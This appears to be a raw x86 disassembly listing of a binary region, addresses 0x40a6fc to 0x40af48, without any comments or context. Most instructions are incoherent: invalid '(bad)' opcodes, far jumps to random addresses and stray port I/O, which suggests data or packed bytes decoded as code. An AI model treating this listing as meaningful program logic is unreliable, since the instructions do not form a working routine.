  40a6fc:	sbb    DWORD PTR [esi+0x2d],esi
  40a6ff:	inc    eax
  40a700:	mov    ecx,DWORD PTR [eax]
  40a702:	call   0xa55c0e1f
  40a707:	test   DWORD PTR [eax+0x6f],esp
  40a70a:	ret    
  40a70b:	popa   
  40a70c:	fs mov bh,0x8f
  40a70f:	lods   eax,DWORD PTR ds:[esi]
  40a710:	fld    DWORD PTR [eax+0x6c]
  40a713:	jno    0x40a6cd
  40a715:	inc    ecx
  40a716:	dec    esp
  40a717:	ins    BYTE PTR es:[edi],dx
  40a718:	mov    ebp,0xea155f2a
  40a71d:	mov    esp,0x500c2d07
  40a722:	cld    
  40a723:	mov    bl,0x3e
  40a725:	pop    ebp
  40a726:	repnz rcr DWORD PTR [esi+ebx*4],cl
  40a72a:	(bad)  [ebp+0x6d8bf8d8]
  40a730:	pop    edx
  40a731:	clc    
  40a732:	imul   eax
  40a734:	popa   
  40a735:	retf   0x2a97
  40a738:	call   0x5a5a:0x3b02d620
  40a73f:	push   0xe6be1bb6
  40a744:	int3   
  40a745:	push   cs
  40a746:	data16 sar al,cl
  40a749:	scas   eax,DWORD PTR es:[edi]
  40a74a:	mov    esi,0xf42f8b76
  40a74f:	push   ecx
  40a750:	push   esp
  40a751:	xchg   DWORD PTR [edx-0x67921bb7],esi
  40a757:	push   0xd6d9e819
  40a75c:	in     al,dx
  40a75d:	mov    BYTE PTR [edi-0x59110e8c],0x69
  40a764:	add    ecx,ebx
  40a766:	mov    ebx,0xd9e79965
  40a76b:	push   esi
  40a76c:	and    DWORD PTR [ebp+0x50],esi
  40a76f:	retf   
  40a770:	jmp    0xb647047f
  40a775:	push   0xd77c0138
  40a77a:	js     0x40a7af
  40a77c:	dec    esp
  40a77d:	add    edi,DWORD PTR [eax+0x71]
  40a780:	imul   ecx,DWORD PTR [ebp+0x27],0x73504745
  40a787:	popf   
  40a788:	shl    DWORD PTR [ebp+0x28],0xc4
  40a78c:	scas   eax,DWORD PTR es:[edi]
  40a78d:	dec    DWORD PTR [eax]
  40a78f:	rcl    esi,0x21
  40a792:	add    BYTE PTR [ebx+0x5f8f233f],ah
  40a798:	sbb    DWORD PTR [ecx],eax
  40a79a:	out    0x81,eax
  40a79c:	mov    edx,DWORD PTR [ebx+0x792f0f4]
  40a7a2:	es add eax,0x2c650659
  40a7a8:	mov    ds:0xf0f0c9c5,eax
  40a7ad:	xor    DWORD PTR [edi-0x4],edx
  40a7b0:	daa    
  40a7b1:	jl     0x40a763
  40a7b3:	cld    
  40a7b4:	imul   esi,DWORD PTR [esi-0x2fec32a8],0xffffffaf
  40a7bb:	cmp    bh,BYTE PTR [esp+eiz*8+0x69654f8d]
  40a7c2:	in     al,dx
  40a7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c4:	retf   0x609a
  40a7c7:	mov    bh,0x31
  40a7c9:	sbb    BYTE PTR [ebp+0x656e13d3],dl
  40a7cf:	call   edi
  40a7d1:	or     eax,0x367bdf2
  40a7d6:	adc    BYTE PTR [edx],dh
  40a7d8:	mov    ebx,DWORD PTR [esp+eiz*2-0x5c]
  40a7dc:	mov    al,ds:0x3ad97acb
  40a7e1:	dec    edx
  40a7e2:	fwait
  40a7e3:	mov    DWORD PTR [edx-0x356c23af],ebp
  40a7e9:	leave  
  40a7ea:	nop
  40a7eb:	aad    0x7b
  40a7ed:	inc    edx
  40a7ee:	lea    ecx,[ecx-0x40]
  40a7f1:	push   ebx
  40a7f2:	xlat   BYTE PTR ds:[ebx]
  40a7f3:	pop    es
  40a7f4:	push   0xffffffcc
  40a7f6:	cmp    BYTE PTR [esi+0x6fb440a],dh
  40a7fc:	mov    ebp,0xc0d59c44
  40a801:	push   0x7964d42b
  40a806:	jp     0x40a844
  40a808:	dec    ebx
  40a809:	(bad)  [ebx-0x2c0dbc18]
  40a80f:	int    0x17
  40a811:	outs   dx,DWORD PTR ds:[esi]
  40a812:	mov    ecx,0x99809906
  40a817:	dec    ebp
  40a818:	push   ss
  40a819:	clc    
  40a81a:	jnp    0x40a7ae
  40a81c:	fwait
  40a81d:	idiv   DWORD PTR [esi-0x42c98790]
  40a823:	les    edi,FWORD PTR [ebx]
  40a825:	and    esp,ebp
  40a827:	push   ebx
  40a828:	jb     0x40a7fa
  40a82a:	pop    ebx
  40a82b:	lahf   
  40a82c:	push   esi
  40a82d:	inc    edi
  40a82e:	xchg   BYTE PTR [ecx+0x15827097],cl
  40a834:	mov    DWORD PTR [ecx+0x7d],edx
  40a837:	gs fwait
  40a839:	test   eax,0xc5a2840f
  40a83e:	push   esi
  40a83f:	cmp    eax,0x7d69718e
  40a844:	and    al,0x7b
  40a846:	dec    ecx
  40a847:	aad    0x73
  40a849:	pop    ebp
  40a84a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a84b:	imul   ebx,DWORD PTR [ebx-0x344cd9d7]
  40a852:	jl     0x40a830
  40a854:	fld    QWORD PTR [ebx]
  40a856:	(bad)  
  40a857:	inc    ebp
  40a859:	pusha  
  40a85a:	rcl    bh,1
  40a85c:	pop    esi
  40a85d:	mov    eax,0x6d32c577
  40a862:	lds    ecx,FWORD PTR [edi-0x75b77130]
  40a868:	xchg   ebx,eax
  40a869:	sbb    esi,esp
  40a86b:	cld    
  40a86c:	sti    
  40a86d:	and    bh,BYTE PTR [eax-0x19f6a9ed]
  40a873:	dec    esp
  40a874:	mov    eax,ds:0xf33f837b
  40a879:	call   0x5650841f
  40a87e:	js     0x40a8c6
  40a880:	push   es
  40a881:	jb     0x40a890
  40a883:	pop    esp
  40a884:	popa   
  40a885:	popf   
  40a886:	adc    BYTE PTR [edi+edx*2-0xa371593],0xf3
  40a88e:	shl    ebx,0xd9
  40a891:	inc    edi
  40a892:	mov    cl,0xb2
  40a894:	lds    eax,FWORD PTR [eax]
  40a896:	pop    eax
  40a897:	push   es
  40a898:	scas   al,BYTE PTR es:[edi]
  40a899:	mov    eax,0x9d3d0a91
  40a89e:	leave  
  40a89f:	aad    0xe0
  40a8a1:	aad    0xe6
  40a8a3:	rcr    DWORD PTR [edi+0x18d0a203],0x9c
  40a8aa:	bound  edi,QWORD PTR [esi-0x49b83189]
  40a8b0:	jmp    0xa3c0:0x496a7a12
  40a8b7:	neg    DWORD PTR [ecx-0x2b]
  40a8ba:	test   BYTE PTR [edi-0x7c5174f0],bl
  40a8c0:	cmp    DWORD PTR [edx-0x33faa98],ebp
  40a8c6:	jbe    0x40a8c1
  40a8c8:	leave  
  40a8c9:	shl    BYTE PTR [eax+0x6c],cl
  40a8cc:	ror    DWORD PTR [edi],cl
  40a8ce:	jge    0x40a896
  40a8d0:	(bad)  
  40a8d2:	lahf   
  40a8d3:	scas   al,BYTE PTR es:[edi]
  40a8d4:	dec    ebp
  40a8d5:	(bad)  [ebx+0x65e3af71]
  40a8db:	cmp    eax,0xcd1a6826
  40a8e0:	out    dx,al
  40a8e1:	xor    edx,ecx
  40a8e3:	sbb    al,0xd
  40a8e5:	push   ds
  40a8e6:	cli    
  40a8e7:	mov    edx,0x48502b41
  40a8ec:	push   edi
  40a8ed:	inc    edi
  40a8ee:	mov    ecx,0xa3999815
  40a8f3:	clc    
  40a8f4:	dec    edx
  40a8f5:	inc    edx
  40a8f6:	jb     0x40a93e
  40a8f8:	push   0x37f76d44
  40a8fd:	push   cs
  40a8fe:	lods   eax,DWORD PTR ds:[esi]
  40a8ff:	sahf   
  40a900:	out    0xd1,al
  40a902:	aas    
  40a903:	aas    
  40a904:	sub    al,0x56
  40a906:	pop    es
  40a907:	rcr    DWORD PTR [ecx+0x62fb25af],cl
  40a90d:	pop    ecx
  40a90e:	call   FWORD PTR [ebx-0x43cb3f7d]
  40a914:	cld    
  40a915:	xor    eax,0xc9ca17bb
  40a91a:	push   ebx
  40a91b:	and    DWORD PTR [ebp+0x256409ac],ebp
  40a921:	adc    DWORD PTR [edx-0x6f],0x673eb992
  40a928:	gs push ebp
  40a92a:	and    al,BYTE PTR [edi]
  40a92c:	repz sub BYTE PTR [esi-0x7b],cl
  40a930:	fmul   DWORD PTR [ebx-0x264e3ae9]
  40a936:	out    0xb1,al
  40a938:	and    cl,ch
  40a93a:	out    0x72,al
  40a93c:	fistp  DWORD PTR [edx-0x1bd4b88c]
  40a942:	xor    BYTE PTR [edi-0x11a3c7ae],dl
  40a948:	or     edx,esp
  40a94a:	cmp    DWORD PTR [ebp-0x6f07a791],esi
  40a950:	inc    edx
  40a951:	cmp    al,0x1e
  40a953:	mov    edi,0x4c2e7dc5
  40a958:	into   
  40a959:	(bad)  
  40a95a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a95b:	pusha  
  40a95c:	aam    0x54
  40a95e:	pop    eax
  40a95f:	pop    esp
  40a960:	mov    ecx,0x67dd60a5
  40a965:	fistp  QWORD PTR ds:0x5d184da0
  40a96b:	inc    ebx
  40a96c:	mov    edx,0x9a17718b
  40a971:	shl    BYTE PTR [edi+0x1f0e0b42],0xc5
  40a978:	mov    eax,0x84bcf47d
  40a97d:	sbb    edi,DWORD PTR [edi+0x42ec2eb2]
  40a983:	adc    esp,esi
  40a985:	retf   0xd4d5
  40a988:	dec    edx
  40a989:	into   
  40a98a:	(bad)  
  40a98b:	push   ss
  40a98c:	retf   
  40a98d:	scas   al,BYTE PTR es:[edi]
  40a98e:	(bad)  
  40a98f:	pop    edx
  40a990:	lods   eax,DWORD PTR ds:[esi]
  40a991:	mov    ds:0xf4ca2721,eax
  40a996:	mov    bl,0x5
  40a998:	push   ss
  40a999:	sqrtps xmm6,XMMWORD PTR [edi]
  40a99c:	sbb    eax,0x80e972e8
  40a9a1:	sbb    eax,DWORD PTR [esi-0x24ad82cb]
  40a9a7:	iret   
  40a9a8:	sahf   
  40a9a9:	cli    
  40a9aa:	in     eax,0x5
  40a9ac:	jbe    0x40a957
  40a9ae:	xchg   ecx,eax
  40a9af:	mov    cl,0x5c
  40a9b1:	jo     0x40aa29
  40a9b3:	mov    DWORD PTR [esp+ebp*2-0x5880ec2e],esi
  40a9ba:	rcl    DWORD PTR [eax-0x39],cl
  40a9bd:	mov    dl,0x7b
  40a9bf:	sub    ecx,ebp
  40a9c1:	mov    ds:0x42d98eef,eax
  40a9c6:	mov    edx,0xd3287f8f
  40a9cb:	xor    BYTE PTR ds:[esp+ebp*2],dl
  40a9cf:	push   cs
  40a9d0:	cli    
  40a9d1:	enter  0x79f4,0x74
  40a9d5:	dec    esi
  40a9d6:	jnp    0x40a965
  40a9d8:	inc    ebx
  40a9d9:	fnsave [ecx-0x29d2bce5]
  40a9df:	xor    eax,DWORD PTR ds:0x8b7b1116
  40a9e5:	inc    ebx
  40a9e6:	neg    DWORD PTR [eax+edx*8+0x51]
  40a9ea:	and    eax,0x276ed131
  40a9ef:	loop   0x40a9a9
  40a9f1:	push   es
  40a9f2:	sbb    dh,BYTE PTR [edi]
  40a9f4:	and    al,dh
  40a9f6:	test   BYTE PTR [eax-0x4a],dh
  40a9f9:	cmp    ecx,DWORD PTR [eax+0x7e]
  40a9fc:	mov    cl,0x32
  40a9fe:	jmp    0x2f23:0xa7df2691
  40aa05:	cmp    bh,BYTE PTR [ecx+edx*4]
  40aa08:	push   ss
  40aa09:	or     esi,DWORD PTR [edx+0x3f479fa6]
  40aa0f:	or     DWORD PTR [ebp-0x6c413107],ecx
  40aa15:	rcr    BYTE PTR [ebx-0x29],1
  40aa18:	mov    eax,ds:0x882f0720
  40aa1d:	mov    ebx,0xfc105872
  40aa22:	cld    
  40aa23:	jmp    DWORD PTR [edi+0x7d066820]
  40aa29:	or     al,0x5c
  40aa2b:	mov    bh,0x7f
  40aa2d:	xor    al,0xa
  40aa2f:	imul   ecx,DWORD PTR [ebx-0x13],0x2ff88b18
  40aa36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa37:	mov    esp,0x2bf8138d
  40aa3c:	adc    edx,0x42
  40aa3f:	jno    0x40aa68
  40aa41:	cli    
  40aa42:	pop    ecx
  40aa43:	xchg   ah,dh
  40aa45:	mov    ebp,DWORD PTR [edi]
  40aa47:	(bad)  
  40aa48:	or     DWORD PTR [ebp-0x5dcf76db],esi
  40aa4e:	sub    BYTE PTR [ecx+0x5],bh
  40aa51:	icebp  
  40aa52:	dec    ebp
  40aa53:	mov    edi,0x39aac11
  40aa58:	jmp    0x6310ecfe
  40aa5d:	mov    esi,0x6f318f6e
  40aa62:	cld    
  40aa63:	jle    0x40aa0a
  40aa65:	or     ecx,DWORD PTR [eax+eiz*2+0x2]
  40aa69:	mov    edx,0xb35ec79
  40aa6e:	sbb    al,0x34
  40aa70:	pop    esp
  40aa71:	dec    edx
  40aa72:	fst    DWORD PTR [eax]
  40aa74:	push   ecx
  40aa75:	add    esp,ebp
  40aa77:	(bad)
  40aa7a:	pop    edi
  40aa7b:	mov    ds:0xef69b63b,eax
  40aa80:	jge    0x40aadd
  40aa82:	adc    al,0x57
  40aa84:	jmp    0x400c86aa
  40aa89:	adc    edi,DWORD PTR [ebx]
  40aa8b:	loope  0x40aacf
  40aa8d:	(bad)
  40aa91:	xor    dh,BYTE PTR [edi-0x7330e658]
  40aa97:	in     al,dx
  40aa98:	in     al,0xc9
  40aa9a:	aas    
  40aa9b:	loope  0x40ab01
  40aa9d:	sub    esp,DWORD PTR [ecx]
  40aa9f:	stos   BYTE PTR es:[edi],al
  40aaa0:	adc    al,0x3f
  40aaa2:	cmp    DWORD PTR [eax],edi
  40aaa4:	stos   BYTE PTR es:[edi],al
  40aaa5:	add    edx,ebp
  40aaa7:	ins    DWORD PTR es:[edi],dx
  40aaa8:	mov    bl,0x90
  40aaaa:	mov    ds:0x16ea110c,al
  40aaaf:	cli    
  40aab0:	in     eax,dx
  40aab1:	out    0x9c,eax
  40aab3:	mov    esi,DWORD PTR [ecx+ebp*1]
  40aab6:	out    0x15,eax
  40aab8:	push   esi
  40aab9:	int    0x55
  40aabb:	mov    dh,BYTE PTR [edx+0x48]
  40aabe:	pop    ss
  40aabf:	test   BYTE PTR fs:[ebx+0x49eb08b9],bh
  40aac6:	stos   DWORD PTR es:[edi],eax
  40aac7:	adc    esi,DWORD PTR [eax+0x1a]
  40aaca:	mov    fs,ecx
  40aacc:	mov    eax,ds:0x149e9536
  40aad1:	pop    esp
  40aad2:	adc    ah,BYTE PTR [esi+0x2f]
  40aad5:	mov    eax,0x232afe7e
  40aada:	sub    BYTE PTR [eax+0x3f],bh
  40aadd:	stc    
  40aade:	(bad)  
  40aae0:	xor    eax,0xbca55a72
  40aae5:	pop    ebp
  40aae6:	xchg   esi,eax
  40aae7:	in     eax,dx
  40aae8:	add    eax,0xdaa2a50e
  40aaed:	and    ch,BYTE PTR [edx-0x67]
  40aaf0:	daa    
  40aaf1:	sbb    eax,0x9d59ed68
  40aaf6:	jmp    0x3b1d:0x414b1c47
  40aafd:	ret    0x965b
  40ab00:	pop    ecx
  40ab01:	test   eax,0x907037be
  40ab06:	dec    esi
  40ab07:	and    eax,0xe4ac914c
  40ab0c:	push   ds
  40ab0d:	push   edx
  40ab0e:	data16 in al,0x56
  40ab11:	push   ebp
  40ab12:	dec    esp
  40ab13:	xor    dh,dh
  40ab15:	in     eax,0x5e
  40ab17:	push   edi
  40ab18:	cmp    BYTE PTR [ebx],0x2e
  40ab1b:	jg     0x40ab1a
  40ab1d:	xchg   edi,eax
  40ab1e:	stos   DWORD PTR es:[edi],eax
  40ab1f:	jle    0x40ab0e
  40ab21:	push   cs
  40ab22:	mov    ebx,0x4cde09ad
  40ab27:	xor    dh,BYTE PTR [edi]
  40ab29:	push   0x31d581e0
  40ab2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab2f:	and    al,0x8d
  40ab31:	mov    ds:0x48f5a4da,eax
  40ab36:	and    dl,BYTE PTR [eax-0x78260542]
  40ab3c:	jb     0x40aaeb
  40ab3e:	cmp    eax,edi
  40ab40:	mov    esi,0x1227f032
  40ab45:	scas   eax,DWORD PTR es:[edi]
  40ab46:	popf   
  40ab47:	sbb    DWORD PTR [esi+ebx*1+0xf],edx
  40ab4b:	fyl2xp1 
  40ab4d:	nop
  40ab4e:	stos   BYTE PTR es:[edi],al
  40ab4f:	adc    esp,DWORD PTR [eax-0x464f905d]
  40ab55:	add    eax,0x8dfa8bd1
  40ab5a:	dec    esi
  40ab5b:	pop    ebx
  40ab5c:	cmp    DWORD PTR [eax+0x26c0445d],0xb6a117ce
  40ab66:	mov    cl,0x3
  40ab68:	mov    esi,0x20db50b4
  40ab6d:	mov    eax,ds:0xf2b8f9e1
  40ab72:	sbb    ebp,ebx
  40ab74:	xchg   esp,eax
  40ab75:	pop    ecx
  40ab76:	add    bh,BYTE PTR [ebx+0x5ee8a84a]
  40ab7c:	out    dx,al
  40ab7d:	adc    ebp,DWORD PTR [esi]
  40ab7f:	gs dec esp
  40ab81:	lahf   
  40ab82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab83:	dec    ecx
  40ab84:	scas   al,BYTE PTR es:[edi]
  40ab85:	pop    ds
  40ab86:	jmp    0x40ab24
  40ab88:	aaa    
  40ab89:	scas   al,BYTE PTR es:[edi]
  40ab8a:	mov    edi,0xc22d063f
  40ab8f:	jmp    0x2c9a:0x9b4e296b
  40ab96:	jge    0x40abcc
  40ab98:	inc    edx
  40ab99:	aas    
  40ab9a:	mov    ?,WORD PTR [esi]
  40ab9c:	xor    DWORD PTR [esi],0x4b
  40ab9f:	inc    esp
  40aba0:	cmp    DWORD PTR [edi-0x5d],ebp
  40aba3:	not    ebx
  40aba5:	jp     0x40ac0c
  40aba7:	pop    esi
  40aba8:	sub    edx,0xffffffe8
  40abab:	pop    ecx
  40abac:	sti    
  40abad:	imul   ebp,DWORD PTR [edx+eiz*2-0x2],0x594e17f6
  40abb5:	inc    eax
  40abb6:	inc    ebx
  40abb7:	dec    esi
  40abb8:	dec    ebp
  40abb9:	and    al,0x69
  40abbb:	les    ecx,FWORD PTR [edi-0x1417cea7]
  40abc1:	outs   dx,DWORD PTR ds:[esi]
  40abc2:	ret    
  40abc3:	mov    edx,DWORD PTR [ebx]
  40abc5:	sbb    ah,BYTE PTR [ebp-0x266a050f]
  40abcb:	sbb    DWORD PTR [edx],ecx
  40abcd:	dec    ebx
  40abce:	jmp    0x3678:0x4c29c5f4
  40abd5:	out    dx,eax
  40abd6:	adc    BYTE PTR [edi+0x5f],bl
  40abd9:	scas   eax,DWORD PTR es:[edi]
  40abda:	cmp    al,0x52
  40abdc:	aaa    
  40abdd:	cld    
  40abde:	sub    esp,DWORD PTR [edx+0x1c93ce4d]
  40abe4:	inc    ecx
  40abe5:	xchg   edi,eax
  40abe6:	repnz sti 
  40abe8:	pop    esp
  40abe9:	or     dl,BYTE PTR [eax-0x5c]
  40abec:	cmp    BYTE PTR [edi-0x6ee94430],al
  40abf2:	xor    DWORD PTR [esi],ebp
  40abf4:	xchg   edi,eax
  40abf5:	xchg   edi,eax
  40abf6:	dec    ecx
  40abf7:	into   
  40abf8:	out    dx,eax
  40abf9:	(bad)  
  40abfa:	pop    esp
  40abfb:	out    0xd8,eax
  40abfd:	cmp    eax,0x44f85964
  40ac02:	test   al,0x96
  40ac04:	sbb    al,0x97
  40ac06:	inc    ebx
  40ac07:	jmp    0x54b40595
  40ac0c:	cmp    al,0x1b
  40ac0e:	shr    DWORD PTR [bp+si-0x6bd6],cl
  40ac13:	ficom  DWORD PTR ds:0x5d760bb4
  40ac19:	mov    bh,dh
  40ac1b:	adc    eax,0x24aacedd
  40ac20:	push   ss
  40ac21:	pushw  0x7922
  40ac25:	jge    0x40ac17
  40ac27:	sub    ebx,esi
  40ac29:	lock in eax,dx
  40ac2b:	xor    BYTE PTR [edx],bl
  40ac2d:	or     dl,cl
  40ac2f:	or     eax,0x1ce307ff
  40ac34:	xchg   esp,eax
  40ac35:	scas   eax,DWORD PTR es:[edi]
  40ac36:	ja     0x40abd2
  40ac38:	fld    TBYTE PTR [edx+ebp*4]
  40ac3b:	push   ss
  40ac3c:	pop    ebp
  40ac3d:	xchg   ebx,eax
  40ac3e:	xlat   BYTE PTR ds:[bx]
  40ac40:	(bad)  
  40ac41:	pop    edx
  40ac43:	ins    BYTE PTR es:[edi],dx
  40ac44:	(bad)  
  40ac45:	sub    ah,dl
  40ac47:	push   0x342a24be
  40ac4c:	inc    ebp
  40ac4d:	add    esi,DWORD PTR [ebx]
  40ac4f:	lock cmc 
  40ac51:	call   0x40f2f098
  40ac56:	stc    
  40ac57:	data16 and dh,bl
  40ac5a:	xchg   ebp,eax
  40ac5b:	or     eax,0xedf51671
  40ac60:	test   DWORD PTR [edi],0xf4ebf34c
  40ac66:	sbb    BYTE PTR [eax+esi*1],bl
  40ac69:	sub    DWORD PTR [ecx-0x77ec88f1],edx
  40ac6f:	push   0xffffffb5
  40ac71:	jle    0x40ace4
  40ac73:	retf   
  40ac74:	popa   
  40ac75:	sub    dl,dl
  40ac77:	lods   al,BYTE PTR ds:[esi]
  40ac78:	pop    ebx
  40ac79:	lods   al,BYTE PTR ds:[esi]
  40ac7a:	push   ebx
  40ac7b:	daa    
  40ac7c:	fimul  DWORD PTR [edx-0x254635e5]
  40ac82:	add    dl,bh
  40ac84:	mov    dh,0x2e
  40ac86:	adc    ecx,DWORD PTR ds:0xaed8d177
  40ac8c:	mov    ebx,0x6eaf1b23
  40ac91:	sbb    eax,0xe4563527
  40ac96:	add    BYTE PTR [bx+si],al
	...
  40ad11:	add    BYTE PTR [eax],al
  40ad13:	add    BYTE PTR [ebx-0x2370a3bd],al
  40ad19:	lahf   
  40ad1a:	ror    DWORD PTR [edi-0x18],cl
  40ad1d:	pushw  0x34
  40ad20:	daa    
  40ad21:	sub    al,0x89
  40ad23:	xchg   edx,eax
  40ad24:	mov    esi,0x6b00005e
  40ad29:	pop    es
  40ad2a:	add    BYTE PTR [eax],al
  40ad2c:	les    esp,FWORD PTR [edx+0xba10907]
  40ad32:	idiv   BYTE PTR cs:[esi+0x4c5e2afa]
  40ad39:	xchg   edx,eax
  40ad3a:	cmp    al,BYTE PTR [eax-0x1a]
  40ad3d:	sub    DWORD PTR [edi-0x7e],0x406da4e5
  40ad44:	lea    esi,[ebp-0x388dd8f7]
  40ad4a:	add    BYTE PTR [eax],cl
  40ad4c:	iret   
  40ad4d:	xchg   edi,eax
  40ad4e:	mov    ebp,0xc8be3601
  40ad53:	les    edi,FWORD PTR [ecx+ebp*1+0x50f76d82]
  40ad5a:	jmp    0x4978:0xac7e93c3
  40ad61:	inc    eax
  40ad62:	ins    DWORD PTR es:[edi],dx
  40ad63:	xchg   BYTE PTR [edx+0x23424984],bh
  40ad69:	and    ebx,0x13ce61d8
  40ad6f:	retf   0xf0d2
  40ad72:	sbb    ebx,esi
  40ad74:	pop    es
  40ad75:	dec    ecx
  40ad76:	sub    edi,DWORD PTR [ebx]
  40ad78:	repz inc esi
  40ad7a:	inc    ebp
  40ad7b:	add    DWORD PTR [eax+eax*8],ebx
  40ad7e:	ds pop ebx
  40ad80:	mov    bh,dh
  40ad82:	mov    edi,0xe6d830fc
  40ad87:	ins    DWORD PTR es:[edi],dx
  40ad88:	imul   ebp,DWORD PTR ds:0x5892d25a,0x78
  40ad8f:	mov    ds:0x29c08f24,eax
  40ad94:	inc    ebp
  40ad95:	dec    eax
  40ad96:	xor    edi,eax
  40ad98:	aas    
  40ad99:	ins    BYTE PTR es:[edi],dx
  40ad9a:	fidivr DWORD PTR [edx]
  40ad9c:	sub    al,0x61
  40ad9e:	idiv   DWORD PTR [edx-0x4c62df8d]
  40ada4:	test   eax,0x6f8d73ef
  40ada9:	adc    cl,BYTE PTR [edi]
  40adab:	add    al,0x7d
  40adad:	xchg   esp,eax
  40adae:	sbb    eax,ecx
  40adb0:	push   ss
  40adb1:	inc    ecx
  40adb2:	sub    al,0x49
  40adb4:	int3   
  40adb5:	dec    ecx
  40adb6:	xor    al,0x8c
  40adb8:	sub    al,0xcd
  40adba:	and    eax,0xab310366
  40adbf:	adc    cl,BYTE PTR [esp+ebx*4-0x4c]
  40adc3:	mov    ebx,edx
  40adc5:	mov    ecx,0xdeb70b24
  40adca:	xor    DWORD PTR [ecx+esi*1+0x1319a3a4],ebx
  40add1:	inc    edi
  40add2:	ins    BYTE PTR es:[edi],dx
  40add3:	(bad)  
  40add4:	out    0xe9,al
  40add6:	jb     0x40adf1
  40add8:	stos   DWORD PTR es:[edi],eax
  40add9:	enter  0x6753,0x57
  40addd:	enter  0x3513,0xa7
  40ade1:	and    bh,al
  40ade3:	test   al,0xb3
  40ade5:	cs popa 
  40ade7:	mov    WORD PTR [esi-0x58],?
  40adea:	scas   eax,DWORD PTR es:[edi]
  40adeb:	lahf   
  40adec:	push   es
  40aded:	test   BYTE PTR [edi+0x28],0xfc
  40adf1:	bound  ecx,QWORD PTR [ecx-0x7]
  40adf4:	push   ds
  40adf5:	scas   eax,DWORD PTR es:[edi]
  40adf6:	repnz cmp BYTE PTR [esi+0x1d],bh
  40adfa:	test   dh,cl
  40adfc:	call   0xe1a7f092
  40ae01:	leave  
  40ae02:	in     eax,dx
  40ae03:	cli    
  40ae04:	mov    ds:0x2fb59650,eax
  40ae09:	jmp    DWORD PTR [esi]
  40ae0b:	gs cdq 
  40ae0d:	popa   
  40ae0e:	xor    ebp,DWORD PTR [ecx-0x608e66a5]
  40ae14:	cmp    ch,BYTE PTR [edx+edx*8+0x4e9a6563]
  40ae1b:	dec    ecx
  40ae1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae1d:	out    0x6d,al
  40ae1f:	jne    0x40ae9d
  40ae21:	jo     0x40ae2b
  40ae23:	or     ch,BYTE PTR [edi]
  40ae25:	mov    edi,0xb3508258
  40ae2a:	inc    ebx
  40ae2b:	jnp    0x40addb
  40ae2d:	adc    ebx,DWORD PTR [esi+0x6c]
  40ae30:	push   edi
  40ae31:	jecxz  0x40ade8
  40ae33:	or     esp,ecx
  40ae35:	pusha  
  40ae36:	sbb    al,0x57
  40ae38:	mov    bl,0xdf
  40ae3a:	sub    DWORD PTR [esi],ecx
  40ae3c:	mov    edi,0xe4f0040f
  40ae41:	xor    al,0xbb
  40ae43:	push   ecx
  40ae44:	fild   DWORD PTR [eax+0x25ed1b07]
  40ae4a:	and    eax,0xe425af78
  40ae4f:	push   eax
  40ae50:	or     BYTE PTR [eax-0x72],ch
  40ae53:	call   0x1263:0xb4c2b989
  40ae5a:	jmp    0x40ae6e
  40ae5c:	pushf  
  40ae5d:	leave  
  40ae5e:	sbb    DWORD PTR [ebp+0x5a36ca45],edx
  40ae64:	cmp    DWORD PTR [eax],0x1652248b
  40ae6a:	xchg   DWORD PTR [eax+0x244efa07],ebp
  40ae70:	push   es
  40ae71:	ret    0xee55
  40ae74:	je     0x40ae53
  40ae76:	mov    edi,0x4a3295ec
  40ae7b:	les    ecx,FWORD PTR [ebx]
  40ae7d:	dec    esp
  40ae7e:	sbb    esi,DWORD PTR [edx-0x3bda7843]
  40ae84:	scas   eax,DWORD PTR es:[edi]
  40ae85:	icebp  
  40ae86:	mov    cl,BYTE PTR [edx*8+0x15b4ac14]
  40ae8d:	or     ebx,DWORD PTR [edi+edi*2+0x1a66c679]
  40ae94:	cwde   
  40ae95:	daa    
  40ae96:	inc    esi
  40ae97:	mov    ebp,0xdb6720a9
  40ae9c:	mov    ebx,ebp
  40ae9e:	(bad)  
  40ae9f:	mov    ebx,0x50decf2
  40aea4:	call   0xcff43398
  40aea9:	xor    ch,BYTE PTR [edx+ecx*8]
  40aeac:	jmp    0x644c:0xd18f5219
  40aeb3:	cs ret 
  40aeb5:	sbb    ebp,ebx
  40aeb7:	pop    esi
  40aeb8:	fisttp WORD PTR [edi]
  40aeba:	jmp    0x6a37:0x1959b2f4
  40aec1:	retf   0x2c9
  40aec4:	sub    al,0xee
  40aec6:	or     DWORD PTR [ebx+0x69de8907],0x65
  40aecd:	sbb    BYTE PTR [ebp-0x1367637a],al
  40aed3:	push   ecx
  40aed4:	push   esp
  40aed5:	inc    edi
  40aed6:	jmp    0x40aee5
  40aed8:	sub    al,0xd1
  40aeda:	mov    ?,ecx
  40aedc:	sar    bh,0xfb
  40aedf:	mov    ch,0x1c
  40aee1:	inc    esp
  40aee2:	ror    DWORD PTR [edx+edx*2-0xe1b6c16],1
  40aee9:	imul   esp,DWORD PTR [eax+0x7a3315cc],0x23
  40aef0:	cli    
  40aef1:	adc    bl,0x8e
  40aef4:	push   es
  40aef5:	pop    edi
  40aef6:	or     eax,0x4d15f0d3
  40aefb:	fs or  al,0x2b
  40aefe:	jp     0x40af7b
  40af00:	inc    esi
  40af01:	jmp    0x40ae9e
  40af03:	pop    ecx
  40af04:	xlat   BYTE PTR ds:[ebx]
  40af05:	mov    edi,DWORD PTR [ebx]
  40af07:	lods   al,BYTE PTR ds:[esi]
  40af08:	pop    ss
  40af09:	aaa    
  40af0a:	pop    ds
  40af0b:	stc    
  40af0c:	sbb    al,0x2b
  40af0e:	mov    ecx,0x1cdbcf13
  40af13:	jecxz  0x40aed5
  40af15:	xor    dh,dl
  40af17:	mov    edi,0x2e2b4611
  40af1c:	int3   
  40af1d:	or     eax,0x4a99b9eb
  40af22:	shl    ebx,cl
  40af24:	push   0x30
  40af26:	jbe    0x40af0c
  40af28:	push   ebx
  40af29:	shl    edi,1
  40af2b:	mov    dl,0xee
  40af2d:	data16 jbe 0x40af23
  40af30:	clc    
  40af31:	popf   
  40af32:	mov    al,ds:0x60e2dc29
  40af37:	repz (bad) 
  40af39:	das    
  40af3a:	call   0x6bf6aa36
  40af3f:	mov    eax,ds:0xd3598295
  40af44:	inc    esi
  40af45:	retf   0xee48
  40af48:	outs   dx,BYTE PTR ds:[esi]
